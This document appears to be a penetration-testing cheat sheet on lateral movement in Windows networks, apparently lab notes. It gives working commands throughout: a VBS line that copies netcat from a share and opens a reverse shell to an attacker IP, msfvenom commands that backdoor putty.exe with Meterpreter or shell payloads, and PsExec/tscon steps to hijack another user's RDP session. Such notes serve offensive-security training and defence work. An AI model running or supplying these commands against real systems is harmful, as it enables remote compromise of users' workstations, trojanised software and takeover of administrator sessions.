2a. Abuse User Behaviour

Take advantage of user actions to gain further access to machines in the network

# Abusing Writable Shares

If common shares are writable, attacker can plant specific files to force users into executing any arbitrary payload and gain access to their machines

1.  E.g. a shortcut to a script / executable file hosted on network share - edit the Target to whatever payload you have on the share
2.  If it is an executable that can be executed in each machine, we can backdoor the executable to force users to execute payloads we want

- When a user opens the shortcut / executable on their workstation, the EXE will be copied from server to its <ins>**%temp%**</ins> folder and executed. Therefore any payload run will be executed in the context of the final user's workstation + logged-in account.

## .vbs scripts Backdoor

If the shared resource is a VBS script, we can put a copy of nc64.exe on the same share and inject the following code to:

### Copy netcat and send a reverse shell back to Kali

`CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1234", 0, True`

## Backdooring .exe Files

We can inject a backdoor inside a shared executable file in the share. E.g. sayÂ **putty.exe** is the shared executable, we can download it and then call msfvenom

### For Meterpreter multi/handler shell

`msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe`

### For normal netcat reverse shell

> msfvenom -a x64 --platform windows -x putty.exe -k -p windows/shell\_reverse\_tcp lhost=&lt;attacker_ip&gt; lport=4444 -b "\\x00" -f exe -o puttyX.exe

# RDP Hijacking

When a user (i.e. Administrator) connects to machine, and closes client instead of logging off.

**REQUIRES SYSTEM PRIVILEGES (on Windows Server 2016 or earlier)**

**Step 1: Use PsExec to get System level privilege**

> `PsExec64.exe -s cmd.exe`

**Step 2: Query to see if there are any active RDP sessions**

> query user

**Step 3: connect to the rdp session**

For example;

> tscon 3 /dest:rdp-tcp$6

In simple terms, the command states that the graphical session `3` owned by luke, should be connected with the  RDP  session `rdp-tcp#6`, owned by the administrator user.

**Note:** Windows Server 2019 won't allow you to connect to another user's session without knowing its password.
